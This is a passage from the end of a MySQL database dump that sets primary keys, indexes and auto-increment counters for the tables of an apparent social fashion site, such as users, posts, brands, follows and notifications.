 ADD PRIMARY KEY (`like_id`);

--
-- Indexes for table `notifications`
--
ALTER TABLE `notifications`
 ADD PRIMARY KEY (`notification_id`);

--
-- Indexes for table `posts`
--
ALTER TABLE `posts`
 ADD PRIMARY KEY (`post_id`);

--
-- Indexes for table `post_photos`
--
ALTER TABLE `post_photos`
 ADD PRIMARY KEY (`post_photo_id`);

--
-- Indexes for table `post_views`
--
ALTER TABLE `post_views`
 ADD PRIMARY KEY (`post_view_id`), ADD UNIQUE KEY `unique_post_user` (`post_id`,`user_id`);

--
-- Indexes for table `ratings`
--
ALTER TABLE `ratings`
 ADD PRIMARY KEY (`rating_id`);

--
-- Indexes for table `sessions`
--
ALTER TABLE `sessions`
 ADD PRIMARY KEY (`session_id`), ADD KEY `last_activity_idx` (`last_activity`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
 ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `shares`
--
ALTER TABLE `shares`
 ADD PRIMARY KEY (`share_id`);

--
-- Indexes for table `specs`
--
ALTER TABLE `specs`
 ADD PRIMARY KEY (`spec_id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
 ADD PRIMARY KEY (`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `brands`
--
ALTER TABLE `brands`
MODIFY `brand_id` int(4) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=413;
--
-- AUTO_INCREMENT for table `clothings`
--
ALTER TABLE `clothings`
MODIFY `clothing_id` int(4) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=17;
--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
MODIFY `comment_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=280;
--
-- AUTO_INCREMENT for table `comment_likes`
--
ALTER TABLE `comment_likes`
MODIFY `comment_like_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=38;
--
-- AUTO_INCREMENT for table `flags`
--
ALTER TABLE `flags`
MODIFY `flag_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `follows`
--
ALTER TABLE `follows`
MODIFY `follow_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=621;
--
-- AUTO_INCREMENT for table `likes`
--
ALTER TABLE `likes`
MODIFY `like_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=157;
--
-- AUTO_INCREMENT for table `notifications`
--
ALTER TABLE `notifications`
MODIFY `notification_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=551;
--
-- AUTO_INCREMENT for table `posts`
--
ALTER TABLE `posts`
MODIFY `post_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=109;
--
-- AUTO_INCREMENT for table `post_photos`
--
ALTER TABLE `post_photos`
MODIFY `post_photo_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=128;
--
-- AUTO_INCREMENT for table `post_views`
--
ALTER TABLE `post_views`
MODIFY `post_view_id` int(20) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `ratings`
--
ALTER TABLE `ratings`
MODIFY `rating_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=109;
--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
MODIFY `id` int(15) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT for table `shares`
--
ALTER TABLE `shares`
MODIFY `share_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=19;
--
-- AUTO_INCREMENT for table `specs`
--
ALTER TABLE `specs`
MODIFY `spec_id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=174;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
MODIFY `user_id` int(11) unsigned NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=183;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
